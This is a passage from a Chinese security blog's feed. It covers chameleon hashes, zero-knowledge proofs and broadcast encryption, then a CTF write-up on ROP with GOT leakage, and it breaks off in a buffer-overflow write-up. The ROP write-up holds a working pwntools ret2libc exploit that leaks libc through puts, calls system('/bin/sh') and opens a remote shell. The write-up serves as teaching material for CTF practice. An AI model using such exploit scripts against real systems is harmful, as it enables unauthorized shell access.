rel="noopener">https://www.zhihu.com/question/38545889</a></p></blockquote><br><p><font color="orage"><strong>⑤ 变色龙哈希函数的攻击案例</strong></font></p><blockquote><p>如果某个网站中密码验证的Hash是这么计算的，而这个网站自己本身有Hash所对应的sk，那么，网站自身就可以伪造所有的密码，来窃取用户数据了。所以，有些时候我们需要怀疑一下一些声称安全的网站到底是不是有后门的。即使说是使用Hash验证，或者加上这样那样的功能来进一步提高安全性，但是如果有这样的后门，对于用户来说还是无能为力的。<br>————————————————<br>☞ 注：引用于CSDN用户@ <a href="https://me.csdn.net/u013590498" target="_blank" rel="noopener">刘巍然-BUAA</a> 的博文<br>原文链接：<a href="https://blog.csdn.net/liuweiran900217/article/details/21819637" target="_blank" rel="noopener">https://blog.csdn.net/liuweiran900217/article/details/21819637</a></p></blockquote></blockquote><h4 id="font-color-navy3对哈希函数重要的误区font"><a class="markdownIt-Anchor" href="#font-color-navy3对哈希函数重要的误区font"></a> <font color="navy">3.对哈希函数重要的误区</font></h4><blockquote><p><strong>哈希函数计算出哈希值的过程不是一个加密过程</strong>，所以不能说<strong>哈希加密/哈希解密</strong>之类的话。</p></blockquote><h3 id="font-color-brown二-零知识证明font"><a class="markdownIt-Anchor" href="#font-color-brown二-零知识证明font"></a> <font color="brown">二、零知识证明</font></h3><h4 id="font-color-navy1什么是零知识证明font"><a class="markdownIt-Anchor" href="#font-color-navy1什么是零知识证明font"></a> <font color="navy">1.什么是零知识证明？</font></h4><blockquote><p>     它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。顾名思义，零知识证明就是既能充分证明自己是某种权益的合法拥有者，又不把有关的信息泄露出去——即给外界的“知识”为“零”。</p></blockquote><h4 id="font-color-navy2零知识满足的性质font"><a class="markdownIt-Anchor" href="#font-color-navy2零知识满足的性质font"></a> <font color="navy">2.零知识满足的性质</font></h4><blockquote><p><strong>(1)正确性</strong>。P无法欺骗V。换言之，若P不知道一个定理的证明方法，则P使V相信他会证明定理的概率很低。</p><p><strong>(2)完备性</strong>。V无法欺骗P。若P知道一个定理的证明方法，则P使V以绝对优势的概率相信他能证明。</p><p><strong>(3)零知识性</strong>。V无法获取任何额外的知识。</p></blockquote><h4 id="font-color-navy3零知识的属性font"><a class="markdownIt-Anchor" href="#font-color-navy3零知识的属性font"></a> <font color="navy">3.零知识的属性</font></h4><blockquote><p>     零知识证明需要满足三个属性：</p><p>        1、如果语句为真，诚实的验证者（即：正确遵循协议的验证者）将由诚实的证明者确信这一事实。</p><p>        2、如果语句为假，不排除有概率欺骗者可以说服诚实的验证者它是真的。</p><p>        3、如果语句为真，证明者的目的就是向验证者证明并使验证者相信自己知道或拥有某一消息，而在证明过程中不可向验证者泄漏任何有关被证明消息的内容。</p><p>     零知识证明并不是数学意义上的证明，因为它存在小概率的误差，欺骗者有可能通过虚假陈述骗过证明者。换句话来说，零知识证明是概率证明而不是确定性证明。但是也存在有技术能将误差降低到可以忽略的值。</p><p>     零知识的形式定义必须使用一些计算模型，最常见的是图灵机的计算模型。</p></blockquote><h4 id="font-color-navy4零知识的例子font"><a class="markdownIt-Anchor" href="#font-color-navy4零知识的例子font"></a> <font color="navy">4.零知识的例子</font></h4><blockquote><p>1.A要向B证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。这时有2个方法：</p><p>     ① A把钥匙出示给B，B用这把钥匙打开该房间的锁，从而证明A拥有该房间的正确的钥匙。</p><p>     ② B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。</p><p>     后面的②方法属于零知识证明。它的好处在于，在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><p><br>2.A拥有B的公钥，A没有见过B，而B见过A的照片，偶然一天两个人见面了，B认出了A，但A不能确定面前的人是否是B，这时B要向A证明自己是B，也有2个方法。</p><p>     ① B把自己的私钥给A，A用公钥对某个数据加密，然后用B的私钥解密，如果正确，则证明对方确实是B。</p><p>     ② A给出一个随机值，并使用B的公钥对其加密，然后将加密后的数据交给B，B用自己的私钥解密并展示给A，如果与A给出的随机值相同，则证明对方是B。</p><p>后面的方法属于零知识证明。</p><p><br>3.有一个缺口环形的长廊，出口和入口距离非常近（在目距之内），但走廊中间某处有一道只能用钥匙打开的门，A要向B证明自己拥有该门的钥匙。采用零知识证明，则B看着A从入口进入走廊，然后又从出口走出走廊，这时B没有得到任何关于这个钥匙的信息，但是完全可以证明A拥有钥匙。</p></blockquote><h3 id="font-color-brown三-广播加密font"><a class="markdownIt-Anchor" href="#font-color-brown三-广播加密font"></a> <font color="brown">三、广播加密</font></h3><h4 id="font-color-navy1什么是广播加密font"><a class="markdownIt-Anchor" href="#font-color-navy1什么是广播加密font"></a> <font color="navy">1.什么是广播加密？</font></h4><blockquote><p>      广播加密是一种在不安全信道上给一组用户传输加密信息的密码体制，它可使发送者选取任意用户集合进行广播加密，只有授权用户才能够解密密文。广播加密有着广泛的实际应用背景，例如，<strong>数字版权管理、付费电视、卫星广播通信</strong>等。一个广播加密方案满足完全抗同谋攻击（fully collusion resistant），即所有撤销用户合作，也无法解密密文。对于一个公钥广播加密方案，用户私钥长度、系统公钥长度、密文长度以及加密解密计算复杂度是衡量性能优劣的重要标准。</p></blockquote><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><ul><li><a href="https://blog.csdn.net/jerry81333/article/details/76141596" target="_blank" rel="noopener">变色龙哈希函数 Chameleon Hash 可变型区块链</a></li><li><a href="https://blog.csdn.net/liuweiran900217/article/details/21819637" target="_blank" rel="noopener">Cryptography - Chameleon Hash</a></li><li><a href="https://www.zhihu.com/question/38545889" target="_blank" rel="noopener">变色龙哈希函数是什么？</a></li><li><a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">零知识证明</a></li><li><a href="https://zhuanlan.zhihu.com/p/24440530" target="_blank" rel="noopener">不是程序员也能看懂的ZCash零知识证明</a></li><li><a href="https://www.leiphone.com/news/201803/egFu5MwIsweBU2WY.html" target="_blank" rel="noopener">零知识证明（Zero-Knowledge Proof）原理详解：非交互式证明实现自动验证防止作假</a></li><li><a href="https://blog.csdn.net/sxjinmingjie/article/details/77746232" target="_blank" rel="noopener">区块链解读-零知识证明</a></li><li><a href="https://www.jiamisoft.com/blog/3400-guangbojiami.html" target="_blank" rel="noopener">广播加密</a></li><li><a href="https://crypto.stackovernet.com/cn/q/5241" target="_blank" rel="noopener">误解广播加密</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-变色龙哈希chameleon-hashfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-变色龙哈希chameleon-hashfont&quot;&gt;&lt;/a&gt; &lt;font
      
    
    </summary>
    
    
      <category term="密码学" scheme="https://muzibing.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>pwn-ROP(GOT表泄露)</title>
    <link href="https://muzibing.github.io/2019/10/08/2019.09.28%EF%BC%8884%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/10/08/2019.09.28（84）/</id>
    <published>2019-10-07T16:00:00.000Z</published>
    <updated>2019-10-08T02:26:39.559Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1got-表-plt-表和-libc-库的相关知识font"><a class="markdownIt-Anchor" href="#font-color-navy1got-表-plt-表和-libc-库的相关知识font"></a> <font color="navy">1.GOT 表、PLT 表和 libc 库的相关知识</font></h4><p><font color="red">① 什么是 GOT 表？</font></p><blockquote><p>GOT(Global Offset Table) 表，即<strong>全局偏移量表</strong>，里面是函数在 libc 库中的绝对地址。</p></blockquote><p><font color="red">② 什么是 PLT 表？</font></p><blockquote><p>PLT(Procedure Link Table) 表，即<strong>程序链接表</strong>，里面是函数在 GOT 表中的地址。</p></blockquote><p><font color="red">③ 什么是 libc 库？</font></p><blockquote><p><strong>libc是Linux下的ANSI C的函数库</strong>。ANSI C是基本的C语言函数库，包含了C语言最基本的<a href="https://baike.baidu.com/item/%E5%BA%93%E5%87%BD%E6%95%B0" target="_blank" rel="noopener">库函数</a>。这个库可以根据 头文件划分为 15 个部分，其中包括：字符类型 ()、<a href="https://baike.baidu.com/item/%E9%94%99%E8%AF%AF%E7%A0%81" target="_blank" rel="noopener">错误码</a>()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 () 等等。这在其他的C语言的IDE中都是有的。（来源百度百科词条）</p></blockquote><p><font color="red">④ GOT、PLT 和 libc 库的联系</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to World of PLT and GOT\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fd = open(<span class="string">"/tmp/text"</span>,File);</span><br><span class="line">    write(fd,<span class="keyword">void</span> *buf,<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_banner();</span><br><span class="line">write_file();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如上图所示， write_file 函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，假设上述的示例 test 在运行过程中，调用方（如 print_banner 和 write_file )是如何通过 PLT 和 GOT 穿针引线之后，最终调用到 glibc 的 printf 和 write 函数的？</p><p><img src="/images/84-1.jpg" alt></p></blockquote><h4 id="font-color-navy2重定位font"><a class="markdownIt-Anchor" href="#font-color-navy2重定位font"></a> <font color="navy">2.重定位</font></h4><blockquote><p>重定位就是把程序的<a href="https://baike.baidu.com/item/%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4/5624042" target="_blank" rel="noopener">逻辑地址空间</a>变换成内存中的实际<a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80/2129" target="_blank" rel="noopener">物理地址</a>空间的过程。它是实现<a href="https://baike.baidu.com/item/%E5%A4%9A%E9%81%93%E7%A8%8B%E5%BA%8F/8192392" target="_blank" rel="noopener">多道程序</a>在内存中同时运行的基础。重定位有两种，分别是<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D/9849090" target="_blank" rel="noopener">动态重定位</a>与<a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D/8785916" target="_blank" rel="noopener">静态重定位</a>。</p><p>① <a href="https://baike.baidu.com/item/%E9%9D%99%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D" target="_blank" rel="noopener">静态重定位</a>：即在程序装入内存的过程中完成，是指在程序开始运行前，程序中的各个地址有关的项均已完成重定位，地址变换通常是在装入时一次完成的，以后不再改变，故成为静态重定位。</p><p>② <a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E9%87%8D%E5%AE%9A%E4%BD%8D" target="_blank" rel="noopener">动态重定位</a>：它不是在程序装入内存时完成的，而是CPU每次访问内存时 由<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">动态地址</a>变换机构（硬件）自动进行把相对地址转换为<a href="https://baike.baidu.com/item/%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">绝对地址</a>。动态重定位需要软件和硬件相互配合完成。</p><p>（以上来源百度百科词条）</p><p>关于重定位的还有以下几篇文章：</p><p><a href="https://blog.csdn.net/cherisegege/article/details/80708143" target="_blank" rel="noopener">① 什么是重定位？为什么需要重定位？</a> 强烈推荐看一下，因为通过这篇文章又引入了几个概念和问题：</p><blockquote><p>概念 1：链接地址和运行地址</p><p>概念 2：位置有关码与位置无关码</p><p>问题 1：链接地址跟运行地址不同的情况下会出现什么情况？</p><p>问题 2：为什么会出现链接地址跟运行地址不同的情况？</p><p>问题 3：什么是重定位？</p><p>问题 4：为什么需要重定位？</p></blockquote><p><a href="https://segmentfault.com/a/1190000016433947" target="_blank" rel="noopener">② 彻底理解链接器：四，重定位</a></p></blockquote><h3 id="font-color-navy3延迟绑定font"><a class="markdownIt-Anchor" href="#font-color-navy3延迟绑定font"></a> <font color="navy">3.延迟绑定</font></h3><blockquote><p>关于延迟绑定的相关内容与动态链接有者密不可分的联系，我只简单地介绍一下延迟绑定的目的和实现原理。</p><p><font color="red">① 延迟绑定的目的</font></p><p>    第一次调用函数时，由连接器负责重定位，第二次调用函数时直接调用，不必经过连接器。</p><p><font color="red">② 延迟绑定的实现原理</font></p><p>    延迟绑定PLT（Procedure Linkage Table）在GOT表基础又做了一次间接跳转。即模块内关于外部函数的地址引用，这下并不直接通过GOT跳转，而是通过一个叫做PLT项的结构来进行，每个外部函数引用都对应PLT表中的一个表项，比如bar()函数在PLT表中的表项称为bar@plt，实现如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; bar@plt:</span><br><span class="line">&gt; jmp    *(bar@GOT)</span><br><span class="line">&gt; push   n</span><br><span class="line">&gt; push   moduleID</span><br><span class="line">&gt; jump   _dl_runtime_resolve</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>    但所谓延迟绑定，即是指在初始未遇到bar()函数之前，GOT表中并无函数bar()的地址信息，而是将后续push n指令的地址填充到GOT中bar()表项中，这时jmp指令将会直接跳转继续执行后续的push n…等指令，该步操作很简单也不需要遍历寻址目标符号，故而代价很低，只需要在生成桩代码时将push n指令位置填入即可。而后的操作便是正常参数压栈工作，其中push n中的参数n对应的是bar()函数符号在重定位表.rel.plt中的下标，push moduleID中的moduleID则是模块ID，调用_dl_runtime_resolve函数完成具体的符号解析和重定位工作，将外部模块中bar()函数的真正地址填入GOT对应的bar@GOT表项。这样当我们下次再次回到PLT表bar@plt表项中转时，便会进入正常的函数调用过程，而不会继续执行push n及之后的代码，那段代码只会在符号未被解析时执行only一次。</p><p><font color="red">更多关于延迟绑定和动态链接的文章如下：</font></p><p><a href="https://blog.csdn.net/roger_ranger/article/details/78903976" target="_blank" rel="noopener">① Linux动态链接之二：优化加速之延迟绑定PLT</a></p><p><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">② 延迟绑定的实现</a></p></blockquote><h3 id="font-color-brown二-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题思路font"></a> <font color="brown">二、解题思路</font></h3><h4 id="font-color-navy1file-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy1file-pwn2font"></a> <font color="navy">1.file pwn2</font></h4><p><img src="/images/84-2.jpg" alt></p><blockquote><p>从上面得到的信息是：<code>pwn2 是一个 32 位 可执行的 ELF 文件，并且是动态连接的</code></p></blockquote><h3 id="font-color-navy2check-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy2check-pwn2font"></a> <font color="navy">2.check pwn2</font></h3><p><img src="/images/84-3.jpg" alt></p><blockquote><p>从上面可以得到的信息是：</p><ul><li>开启了 NX，表示我们不能通过栈溢出来执行 shellcode</li><li>没有开启栈保护，我们可以利用栈溢出这个漏洞的（Stack:    No canary found）</li><li>我们对 GOT 表具有写的权限（RELRO:    Partial RELRO）</li></ul></blockquote><h4 id="font-color-navy3ida-反编译-pwn2font"><a class="markdownIt-Anchor" href="#font-color-navy3ida-反编译-pwn2font"></a> <font color="navy">3.IDA 反编译 pwn2</font></h4><blockquote><p><font color="red">① 查找漏洞</font></p><p>通过 IDA 对 pwn2 的处理后，我们可以在函数 <code>sub_80484EA()</code> 中看到可能出现的漏洞——<code>read() 函数</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt; <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-58h]@1</span></span><br><span class="line">&gt; </span><br><span class="line">&gt; <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">&gt; <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>我们可以通过简单的计算：</p><p>     ☛ buf 缓冲区可以读入的数据有：0xC8u（十进制为：200个字节）</p><p>     ☛ 但是 buf 离 ebp 的距离有：0x58h（十进制为：88）</p><p>所以我们输入的数据大小超过了 buf 的实际空间大小，如下图所示：</p><p><img src="/images/84-4.png" alt></p><p><font color="red">② 查找 system() 和 /bin/sh </font></p><p>通过在 IDA 里面查找，我们没有找到 system() 和 \bin\sh 那我们必须通过另外一个思路想办法获得 system() 和 /bin/sh：我们可以通过 <code>ROPgadget</code> 命令来查找 <code>system()</code> 和 <code>/bin/sh</code></p><center>ROPgadget --binary pwn2 --string 'system'</center>但是并没有找到该字符：<p><img src="/images/84-8.jpg" alt></p></blockquote><h3 id="font-color-navy4解题思路font"><a class="markdownIt-Anchor" href="#font-color-navy4解题思路font"></a> <font color="navy">4.解题思路</font></h3><blockquote><p>通过我们对文件 <code>pwn2</code> 进行分析后，我们没有发现 system() 和/bin/sh，那么我们该怎么得到这两个的地址呢？</p><p><font color="red">① 查看 pwn2 用到的库</font></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ldd pwn2</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><p><img src="/images/84-4.jpg" alt></p><p>从上面的得到的信息可以看出，文件 <code>pwn2</code> 中用到的库有 <code>linux-gate.so.1</code> 、<code>libc.so.6</code>、<code>ld-linux.so.2</code>，下面我们来看看这三个库中有什么？</p><p>    ☛ <code>linux-gate.so.1</code>：这个所谓的&quot;linux-gate.so.1&quot;的内容就是内核映射的代码，系统中其实并不存在这样一个链接库文件，它的名字是由ldd自己起的，而在老版本的ldd中，虽然能够检测到这段代码，但是由于没有命名而且在系统中找不到对应链接库文件，所以会有一些显示上的问题。</p><p>    ☛ <code>libc.so.6</code>：我们通过查看<code>libc.so.6</code>库，可以看到这个库包含了 <code>pwn2</code> 程序中出现的<code>puts()函数</code>，以及我们想找的 <code>system()</code>函数以及<code>/bin/sh</code></p><p><img src="/images/84-5.jpg" alt></p><p><img src="/images/84-6.jpg" alt></p><p>    ☛ <code>ld-linux.so.2</code>：这是glibc的库文件，一般链接到相应版本的ld-xxx.so上，我没有具体的查看封装的函数。</p><p><br>下面的是我们计算机中有的库：</p><p><img src="/images/84-7.jpg" alt></p><p><br><font color="red">② 获得 system 和 /bin/sh 的地址</font></p><p>    我们可以利用<strong>重定位</strong>，来泄露 <code>puts()</code> 函数的 got 表，以及通过puts() 函数在 libc.so.6 中的偏移地址，来得到 libc  的<strong>基地址</strong>。</p><p>    我们通过得到的基地址，再通过获取 <code>system()</code> 和 <code>/bin/sh</code> 的偏移地址，我们就可以得到 <code>system()</code> 和 <code>/bin/sh</code> 的实际地址。</p><p>    <font color="navy">libcbase = puts_addr - libc.dump(‘puts’)</font><br>    <font color="navy">system_addr = libcbase + libc.dump(‘system’)</font><br>    <font color="navy">binsh_addr = libcbase + libc.dump(‘str_bin_sh’)</font></p><p>    我们可以通过 <a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LicSearcher</a> 根据 <code>puts()</code> 函数的版本，来查找 <code>puts()</code> 、<code>system()</code> 和 <code>/bin/sh</code>的偏移</p></blockquote><h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3><h4 id="font-color-navy1编写脚本font"><a class="markdownIt-Anchor" href="#font-color-navy1编写脚本font"></a> <font color="navy">1.编写脚本</font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">pwn2 = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'vps1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of "puts"</span></span><br><span class="line"></span><br><span class="line">puts_got = pwn2.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = pwn2.plt[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># First payload (the function is to get address of puts)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"put_address:"</span> + hex(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_got:'</span> + hex(puts_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'puts_plt:'</span> + hex(puts_plt)</span><br><span class="line"><span class="comment">#print libc.dump("system")</span></span><br><span class="line"><span class="comment">#print libc.dump("str_bin_sh")</span></span><br><span class="line"><span class="comment">#print libc.dump("_libc_start_main")</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#According the address of offset in libc, we can gain the address of system and binsh</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc.dump(puts):"</span> + hex(libc.dump(<span class="string">'puts'</span>))</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"-----------------------------------get_shell----------------------------------"</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="font-color-navy2执行脚本font"><a class="markdownIt-Anchor" href="#font-color-navy2执行脚本font"></a> <font color="navy">2.执行脚本</font></h4><p><img src="/images/84-10.jpg" alt></p><h4 id="font-color-navy3查看当前目录下的文件夹font"><a class="markdownIt-Anchor" href="#font-color-navy3查看当前目录下的文件夹font"></a> <font color="navy">3.查看当前目录下的文件夹</font></h4><p><img src="/images/84-11.jpg" alt></p><h4 id="font-color-navy4获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy4获取-flagfont"></a> <font color="navy">4.获取 flag</font></h4><p><img src="/images/84-12.jpg" alt></p><h3 id="font-color-brown四-参考文章font"><a class="markdownIt-Anchor" href="#font-color-brown四-参考文章font"></a> <font color="brown">四、参考文章</font></h3><ul><li><a href="https://baijiahao.baidu.com/s?id=1627680279509045317&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">延迟绑定的实现</a></li><li><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">深入了解GOT,PLT和动态链接</a>★</li><li><a href="https://www.zhihu.com/question/21249496" target="_blank" rel="noopener">Linux动态链接为什么要用PLT和GOT表？</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、基础知识&lt;/font&gt;&lt;/
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-bof（基础类型题目）</title>
    <link href="https://muzibing.github.io/2019/09/24/2019.09.24%EF%BC%8883%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/24/2019.09.24（83）/</id>
    <published>2019-09-23T16:00:00.000Z</published>
    <updated>2019-11-06T14:13:33.116Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-基础知识font"><a class="markdownIt-Anchor" href="#font-color-brown一-基础知识font"></a> <font color="brown">一、基础知识</font></h3><h4 id="font-color-navy1内存中栈的结构font"><a class="markdownIt-Anchor" href="#font-color-navy1内存中栈的结构font"></a> <font color="navy">1.内存中栈的结构</font></h4><p><img src="/images/83-1.jpg" alt></p><blockquote><p>正如上图所示，栈是由“由高地址向低地址”方向生长。</p></blockquote><h4 id="font-color-navy2常见的漏洞类型font"><a class="markdownIt-Anchor" href="#font-color-navy2常见的漏洞类型font"></a> <font color="navy">2.常见的漏洞类型</font></h4><blockquote><p>常见的漏洞类型有如下几种：</p><p><font color="orage"><strong>① 逻辑错误</strong></font></p><p><br><font color="orage"><strong>② 内存破坏</strong></font></p><p>    ✦ <font color="red">栈溢出</font></p><p>    ✦ 整数溢出</p><p>    ✦ 格式化字符串</p><p>    ✦ 堆溢出</p><p>    ✦ 释放后使用</p></blockquote><h3 id="font-color-brown二-解题思路font"><a class="markdownIt-Anchor" href="#font-color-brown二-解题思路font"></a> <font color="brown">二、解题思路</font></h3><h4 id="font-color-navy1寻找漏洞font"><a class="markdownIt-Anchor" href="#font-color-navy1寻找漏洞font"></a> <font color="navy">1.寻找漏洞</font></h4><blockquote><p>通过 IDA Pro 对文件进行逆向，通过对伪代码的分析，我们可以看到在函数 <code>sub_8048573</code> 中，有一个明显的漏洞——read（）函数。我们是如何知道该处是一个漏洞呢？</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_8048573()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+Ch] [bp-1Ch]@1</span></span><br><span class="line"></span><br><span class="line">  sub_804851B();</span><br><span class="line">  sub_804854A();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"can you pwn me?"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span 